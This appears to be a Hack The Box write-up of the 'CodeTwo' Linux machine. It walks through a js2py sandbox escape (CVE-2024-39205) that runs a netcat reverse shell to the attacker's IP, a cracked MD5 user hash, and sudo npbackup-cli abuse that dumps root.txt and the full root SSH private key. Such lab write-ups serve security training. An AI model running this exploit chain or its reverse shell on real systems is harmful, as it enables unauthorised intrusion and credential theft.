---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Easy
  - CVE-2024-39205
  - js2py
  - Pyload
  - sqlite3
  - Hash
  - npbackup
---

![](images/CodePartTwo.png)

## Table of Contents

- [Summary](#Summary)
- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 8000/TCP](#Enumeration-of-Port-8000TCP)
    - [Investigation Application](#Investigation-Application)
- [Foothold](#Foothold)
    - [CVE-2024-39205: Pyload Remote Code Execution (RCE)](#CVE-2024-39205-Pyload-Remote-Code-Execution-RCE)
- [Enumeration (app)](#Enumeration-app)
- [Privilege Escalation to marco](#Privilege-Escalation-to-marco)
- [Cracking the Hash](#Cracking-the-Hash)
- [user.txt](#usertxt)
- [Enumeration (marco)](#Enumeration-marco)
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
    - [npbackup Abuse](#npbackup-Abuse)
- [root.txt](#roottxt)
- [Post Exploitation](#Post-Exploitation)

## Summary

The box starts by `downloading` a copy of the `application` served on port `8000/TCP`. This allows to perform a `code review` and figure out that the `code editor` uses `js2py` which is vulnerable to `CVE-2024-39205` aka `Remote Code Execution (RCE)` in `Pyload`. By using a `Proof of Concept (PoC)` exploit with a `modified reverse shell payload`, `Foothold` on the box can be achieved.

For `Privilege Escalation` to the user `marco`, his `Hash` can be dumped from the `sqlite3` database on the machine. This gives access to the `user.txt`.

As `marco` now it is possible to execute `npbackup-cli` using `sudo`. This capability and a modified `config file` pointing to `/root/` makes it possible to exfiltrate every file out of `/root/` like for example the `SSH Private Key` or the `root.txt.`

## Reconnaissance

### Port Scanning

The initial `port scan` using `Nmap` revealed port `22/TCP` and port `8000/TCP`.

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- 10.129.151.218 --min-rate 10000
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 21:03 CEST
Nmap scan report for 10.129.151.218
Host is up (0.022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 6.32 seconds
```

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p 22,8000 10.129.151.218  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 21:03 CEST
Nmap scan report for 10.129.151.218
Host is up (0.013s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-title: Welcome to CodeTwo
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.21 seconds
```

### Enumeration of Port 8000/TCP

On port `8000/TCP` we could `download` the `application`, `register` a new user and `login` using the newly created user. The last option allowed us to run `JavaScript` code inside an `online code editor`.

- [http://10.129.151.218:8000/](http://10.129.151.218:8000/)

```shell
┌──(kali㉿kali)-[~]
└─$ whatweb http://10.129.151.218:8000/
http://10.129.151.218:8000/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[gunicorn/20.0.4], IP[10.129.151.218], Script, Title[Welcome to CodeTwo]
```

![](images/2025-08-16_21-05_8000_website.png)

- [http://10.129.151.218:8000/download](http://10.129.151.218:8000/download)

![](images/2025-08-16_21-11_8000_register.png)

![](images/2025-08-16_21-12_8000_login.png)

![](images/2025-08-16_21-12_8000_dashboard.png)
### Investigation Application

We downloaded the application to take a closer look at it.

```shell
┌──(kali㉿kali)-[/media/…/Machines/CodeTwo/files/extracted]
└─$ unzip app.zip 
Archive:  app.zip
   creating: app/
   creating: app/templates/
  inflating: app/templates/login.html  
  inflating: app/templates/dashboard.html  
  inflating: app/templates/reviews.html  
  inflating: app/templates/register.html  
  inflating: app/templates/index.html  
  inflating: app/templates/base.html  
  inflating: app/requirements.txt    
   creating: app/static/
   creating: app/static/js/
  inflating: app/static/js/script.js  
   creating: app/static/css/
  inflating: app/static/css/styles.css  
  inflating: app/app.py              
   creating: app/instance/
  inflating: app/instance/users.db
```

The `users.db` immediately caught our attention but unfortunately it didn't stored any user information.

```shell
┌──(kali㉿kali)-[/media/…/Machines/CodeTwo/files/extracted]
└─$ strings app/instance/users.db 
SQLite format 3
Wtablecode_snippetcode_snippet
CREATE TABLE code_snippet (
        id INTEGER NOT NULL, 
        user_id INTEGER NOT NULL, 
        code TEXT NOT NULL, 
        PRIMARY KEY (id), 
        FOREIGN KEY(user_id) REFERENCES user (id)
Ctableuseruser
CREATE TABLE user (
        id INTEGER NOT NULL, 
        username VARCHAR(80) NOT NULL, 
        password_hash VARCHAR(128) NOT NULL, 
        PRIMARY KEY (id), 
        UNIQUE (username)
indexsqlite_autoindex_user_1user
```

Next we analyzed the `app.py` and found not only a `secret key` but also noticed that it made used of `js2py`.

```python
┌──(kali㉿kali)-[/media/…/Machines/CodeTwo/files/extracted]
└─$ cat app/app.py 
from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory
from flask_sqlalchemy import SQLAlchemy
import hashlib
import js2py
import os
import json

js2py.disable_pyimport()
app = Flask(__name__)
app.secret_key = 'S3cr3tK3yC0d3Tw0'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(128), nullable=False)

class CodeSnippet(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    code = db.Column(db.Text, nullable=False)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/dashboard')
def dashboard():
    if 'user_id' in session:
        user_codes = CodeSnippet.query.filter_by(user_id=session['user_id']).all()
        return render_template('dashboard.html', codes=user_codes)
    return redirect(url_for('login'))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        password_hash = hashlib.md5(password.encode()).hexdigest()
        new_user = User(username=username, password_hash=password_hash)
        db.session.add(new_user)
        db.session.commit()
        return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        password_hash = hashlib.md5(password.encode()).hexdigest()
        user = User.query.filter_by(username=username, password_hash=password_hash).first()
        if user:
            session['user_id'] = user.id
            session['username'] = username;
            return redirect(url_for('dashboard'))
        return "Invalid credentials"
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('user_id', None)
    return redirect(url_for('index'))

@app.route('/save_code', methods=['POST'])
def save_code():
    if 'user_id' in session:
        code = request.json.get('code')
        new_code = CodeSnippet(user_id=session['user_id'], code=code)
        db.session.add(new_code)
        db.session.commit()
        return jsonify({"message": "Code saved successfully"})
    return jsonify({"error": "User not logged in"}), 401

@app.route('/download')
def download():
    return send_from_directory(directory='/home/app/app/static/', path='app.zip', as_attachment=True)

@app.route('/delete_code/<int:code_id>', methods=['POST'])
def delete_code(code_id):
    if 'user_id' in session:
        code = CodeSnippet.query.get(code_id)
        if code and code.user_id == session['user_id']:
            db.session.delete(code)
            db.session.commit()
            return jsonify({"message": "Code deleted successfully"})
        return jsonify({"error": "Code not found"}), 404
    return jsonify({"error": "User not logged in"}), 401

@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(host='0.0.0.0', debug=True)
```

## Foothold

### CVE-2024-39205: Pyload Remote Code Execution (RCE)

The `/run_code` endpoint accepted `arbitrary JavaScript code` and `executed` it via `js2py.eval_js()`.

```python
<--- CUT FOR BREVITY --->
@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)  # Arbitrary code execution
        return jsonify({'result': result})
<--- CUT FOR BREVITY --->
```

We searched for a `Proof of Concept (PoC)` exploit and found one targeting `Pyload`.

- [https://github.com/Marven11/CVE-2024-39205-Pyload-RCE](https://github.com/Marven11/CVE-2024-39205-Pyload-RCE)

The exploit chain breakdown was basically the following:

- `Object.getOwnPropertyNames({})` -> Access to Python object attributes
- `.__getattribute__("__getattribute__")` → Python attribute access method
- `.__class__.__base__` → Access to Python's base object class
- `.__subclasses__()` → Enumerate all Python classes
- Find `subprocess.Popen` class → Direct access to process execution
- Execute reverse shell payload → Full system access\

We modified the `PoC` with our own `reverse shell` payload and let the application execute it.

```js
let cmd = "busybox nc 10.10.16.21 4444 -e bash"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
function f() {
    return n11
}
```

This gave us a `callback` on our `listener` and `foothold` on the box.

```shell
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.21] from (UNKNOWN) [10.129.151.218] 36860
```

We upgraded our shell and moved on.

```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
app@codetwo:~/app$ ^Z
zsh: suspended  nc -lnvp 4444
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ stty raw -echo;fg
[1]  + continued  nc -lnvp 4444

app@codetwo:~/app$ 
app@codetwo:~/app$ export XTERM=xterm
app@codetwo:~/app$
```

## Enumeration (app)

A quick enumeration of the user `app` showed another user on the system called `marco`.

```shell
app@codetwo:~/app$ id
uid=1001(app) gid=1001(app) groups=1001(app)
```

```shell
app@codetwo:~/app$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
marco:x:1000:1000:marco:/home/marco:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
app:x:1001:1001:,,,:/home/app:/bin/bash
mysql:x:114:118:MySQL Server,,,:/nonexistent:/bin/false
_laurel:x:997:997::/var/log/laurel:/bin/false
```

| Username |
| -------- |
| marco    |

## Privilege Escalation to marco

To search for `credentials` for `escalating` our `privileges`, we checked the `sqlite3` database file on the box and found the `Hash` for `marco`.

```shell
app@codetwo:~/app/instance$ strings users.db
SQLite format 3
Wtablecode_snippetcode_snippet
CREATE TABLE code_snippet (
        id INTEGER NOT NULL, 
        user_id INTEGER NOT NULL, 
        code TEXT NOT NULL, 
        PRIMARY KEY (id), 
        FOREIGN KEY(user_id) REFERENCES user (id)
Ctableuseruser
CREATE TABLE user (
        id INTEGER NOT NULL, 
        username VARCHAR(80) NOT NULL, 
        password_hash VARCHAR(128) NOT NULL, 
        PRIMARY KEY (id), 
        UNIQUE (username)
indexsqlite_autoindex_user_1user
Mfoobar3858f62230ac3c915f300c664312c63f'
Mappa97588c0e2fa3a024876339e27aeb42e)
Mmarco649c9d65a206a75f5abe509fe128bce5
foobar
        marco
```

## Cracking the Hash

Luckily for us there was no need to crack the hash because `crackstation.net` had the cleartext password already in it's inventory.

- [https://crackstation.net/](https://crackstation.net/)

| Username | Password           |
| -------- | ------------------ |
| marco    | sweetangelbabylove |

This gave us access to `marco` via `SSH` and allowed us to grab the `user.txt`.

```shell
┌──(kali㉿kali)-[~]
└─$ ssh marco@10.129.151.218
The authenticity of host '10.129.151.218 (10.129.151.218)' can't be established.
ED25519 key fingerprint is SHA256:KGKFyaW9Pm7DDxZe/A8oi/0hkygmBMA8Y33zxkEjcD4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.151.218' (ED25519) to the list of known hosts.
marco@10.129.151.218's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat 16 Aug 2025 07:48:13 PM UTC

  System load:           0.02
  Usage of /:            56.8% of 5.08GB
  Memory usage:          24%
  Swap usage:            0%
  Processes:             228
  Users logged in:       0
  IPv4 address for eth0: 10.129.151.218
  IPv6 address for eth0: dead:beef::250:56ff:fe94:b143


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


Last login: Sat Aug 16 19:48:14 2025 from 10.10.16.21
marco@codetwo:~$
```

## user.txt

```shell
marco@codetwo:~$ cat user.txt 
4a08286a48aa6238381ab47a7179bd81
```

## Enumeration (marco)

The user `marco` was member of the `backups` group and also was allowed to execute `npbackup-cli` using `sudo`.

```shell
marco@codetwo:~$ id
uid=1000(marco) gid=1000(marco) groups=1000(marco),1003(backups)
```

```shell
marco@codetwo:~$ sudo -l
Matching Defaults entries for marco on codetwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codetwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

By simply firing it up it showed that it required a `config file` in order to work properly.

```shell
marco@codetwo:~$ sudo /usr/local/bin/npbackup-cli
2025-08-17 06:40:54,594 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-08-17 06:40:54,594 :: CRITICAL :: Cannot run without configuration file.
2025-08-17 06:40:54,600 :: INFO :: ExecTime = 0:00:00.009087, finished, state is: critical.
```

In the `home directory` of `marco` we found a `npbackup.conf` which we planned to use for `Privilege Escalation`.

```shell
marco@codetwo:~$ ls -la
total 44
drwxr-x--- 6 marco marco 4096 Aug 17 06:30 .
drwxr-xr-x 4 root  root  4096 Jan  2  2025 ..
drwx------ 7 root  root  4096 Apr  6 03:50 backups
lrwxrwxrwx 1 root  root     9 Oct 26  2024 .bash_history -> /dev/null
-rw-r--r-- 1 marco marco  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 marco marco 3771 Feb 25  2020 .bashrc
drwx------ 2 marco marco 4096 Apr  6 04:02 .cache
drwxrwxr-x 4 marco marco 4096 Feb  1  2025 .local
lrwxrwxrwx 1 root  root     9 Nov 17  2024 .mysql_history -> /dev/null
-rw-rw-r-- 1 root  root  2893 Jun 18 11:16 npbackup.conf
-rw-r--r-- 1 marco marco  807 Feb 25  2020 .profile
lrwxrwxrwx 1 root  root     9 Oct 26  2024 .python_history -> /dev/null
lrwxrwxrwx 1 root  root     9 Oct 31  2024 .sqlite_history -> /dev/null
drwx------ 2 marco marco 4096 Oct 20  2024 .ssh
-rw-r----- 1 root  marco   33 Aug 17 05:39 user.txt
```

## Privilege Escalation to root

### npbackup Abuse

First of all we moved to `/dev/shm` to have a proper working directory. Then we copied the `npbackup.conf` to it.

```shell
marco@codetwo:/dev/shm$ cp /home/marco/npbackup.conf /dev/shm/marco_root.conf
```

Now we modified the `backup path` and set it to `/root/`.

```shell
marco@codetwo:/dev/shm$ sed -i 's|/home/app/app/|/root/|g' /dev/shm/marco_root.conf
```

```shell
marco@codetwo:/dev/shm$ cat marco_root.conf 
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri: 
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
      - /root/
      source_type: folder_list
      exclude_files_larger_than: 0.0
    repo_opts:
      repo_password: 
        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
      retention_policy: {}
      prune_max_unused: 0
    prometheus: {}
    env: {}
    is_protected: false
groups:
  default_group:
    backup_opts:
      paths: []
      source_type:
      stdin_from_command:
      stdin_filename:
      tags: []
      compression: auto
      use_fs_snapshot: true
      ignore_cloud_files: true
      one_file_system: false
      priority: low
      exclude_caches: true
      excludes_case_ignore: false
      exclude_files:
      - excludes/generic_excluded_extensions
      - excludes/generic_excludes
      - excludes/windows_excludes
      - excludes/linux_excludes
      exclude_patterns: []
      exclude_files_larger_than:
      additional_parameters:
      additional_backup_only_parameters:
      minimum_backup_size_error: 10 MiB
      pre_exec_commands: []
      pre_exec_per_command_timeout: 3600
      pre_exec_failure_is_fatal: false
      post_exec_commands: []
      post_exec_per_command_timeout: 3600
      post_exec_failure_is_fatal: false
      post_exec_execute_even_on_backup_error: true
      post_backup_housekeeping_percent_chance: 0
      post_backup_housekeeping_interval: 0
    repo_opts:
      repo_password:
      repo_password_command:
      minimum_backup_age: 1440
      upload_speed: 800 Mib
      download_speed: 0 Mib
      backend_connections: 0
      retention_policy:
        last: 3
        hourly: 72
        daily: 30
        weekly: 4
        monthly: 12
        yearly: 3
        tags: []
        keep_within: true
        group_by_host: true
        group_by_tags: true
        group_by_paths: false
        ntp_server:
      prune_max_unused: 0 B
      prune_max_repack_size:
    prometheus:
      backup_job: ${MACHINE_ID}
      group: ${MACHINE_GROUP}
    env:
      env_variables: {}
      encrypted_env_variables: {}
    is_protected: false
identity:
  machine_id: ${HOSTNAME}__blw0
  machine_group:
global_prometheus:
  metrics: false
  instance: ${MACHINE_ID}
  destination:
  http_username:
  http_password:
  additional_labels: {}
  no_cert_verify: false
global_options:
  auto_upgrade: false
  auto_upgrade_percent_chance: 5
  auto_upgrade_interval: 15
  auto_upgrade_server_url:
  auto_upgrade_server_username:
  auto_upgrade_server_password:
  auto_upgrade_host_identity: ${MACHINE_ID}
  auto_upgrade_group: ${MACHINE_GROUP}
```

Finally we provided the modified `config file` using the `-c` option and created a backup of the `/root/` folder.

```shell
marco@codetwo:/dev/shm$ sudo /usr/local/bin/npbackup-cli -c marco_root.conf --backup
2025-08-16 20:44:09,059 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-08-16 20:44:09,091 :: INFO :: Loaded config 09F15BEC in /dev/shm/marco_root.conf
2025-08-16 20:44:09,102 :: INFO :: Searching for a backup newer than 1 day, 0:00:00 ago
2025-08-16 20:44:11,211 :: INFO :: Snapshots listed successfully
2025-08-16 20:44:11,213 :: INFO :: Recent snapshot 41408e8c of 2025-08-16T20:43:35.396141904Z exists !
2025-08-16 20:44:11,213 :: INFO :: Most recent backup in repo default is from 2025-08-16 20:43:35.396141+00:00
2025-08-16 20:44:11,213 :: INFO :: Runner took 2.111176 seconds for has_recent_snapshot
2025-08-16 20:44:11,213 :: INFO :: No backup necessary
2025-08-16 20:44:11,214 :: INFO :: Runner took 2.112854 seconds for backup
2025-08-16 20:44:11,214 :: INFO :: Operation finished
2025-08-16 20:44:11,220 :: INFO :: ExecTime = 0:00:02.163029, finished, state is: success.
```

We verified that it contained everything we expected using the `--ls` option.

```shell
marco@codetwo:/dev/shm$ sudo /usr/local/bin/npbackup-cli -c /dev/shm/marco_root.conf --ls
2025-08-16 20:44:19,206 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-08-16 20:44:19,235 :: INFO :: Loaded config 09F15BEC in /dev/shm/marco_root.conf
2025-08-16 20:44:19,245 :: INFO :: Showing content of snapshot latest in repo default
2025-08-16 20:44:21,442 :: INFO :: Successfully listed snapshot latest content:
snapshot 41408e8c of [/root] at 2025-08-16 20:43:35.396141904 +0000 UTC by root@codetwo filtered by []:
/root
/root/.bash_history
/root/.bashrc
/root/.cache
/root/.cache/motd.legal-displayed
/root/.local
/root/.local/share
/root/.local/share/nano
/root/.local/share/nano/search_history
/root/.mysql_history
/root/.profile
/root/.python_history
/root/.sqlite_history
/root/.ssh
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
/root/.vim
/root/.vim/.netrwhist
/root/root.txt
/root/scripts
/root/scripts/backup.tar.gz
/root/scripts/cleanup.sh
/root/scripts/cleanup_conf.sh
/root/scripts/cleanup_db.sh
/root/scripts/cleanup_marco.sh
/root/scripts/npbackup.conf
/root/scripts/users.db

2025-08-16 20:44:21,442 :: INFO :: Runner took 2.19786 seconds for ls
2025-08-16 20:44:21,443 :: INFO :: Operation finished
2025-08-16 20:44:21,449 :: INFO :: ExecTime = 0:00:02.245434, finished, state is: success.
```
## root.txt

And finally we simply dumped every file we wanted out of the backup using `--dump` and the specified the desired file.

```shell
marco@codetwo:/dev/shm$ sudo /usr/local/bin/npbackup-cli -c /dev/shm/marco_root.conf --dump /root/root.txt
2282396fc1b3b0947ae6c4407f6470f6
```

## Post Exploitation

```shell
marco@codetwo:/dev/shm$ sudo /usr/local/bin/npbackup-cli -c /dev/shm/marco_root.conf --dump /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/CodeTwo/files]
└─$ cat root_id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA9apNjja2/vuDV4aaVheXnLbCe7dJBI/l4Lhc0nQA5F9wGFxkvIEy
VXRep4N+ujxYKVfcT3HZYR6PsqXkOrIb99zwr1GkEeAIPdz7ON0pwEYFxsHHnBr+rPAp9d
EaM7OOojou1KJTNn0ETKzvxoYelyiMkX9rVtaETXNtsSewYUj4cqKe1l/w4+MeilBdFP7q
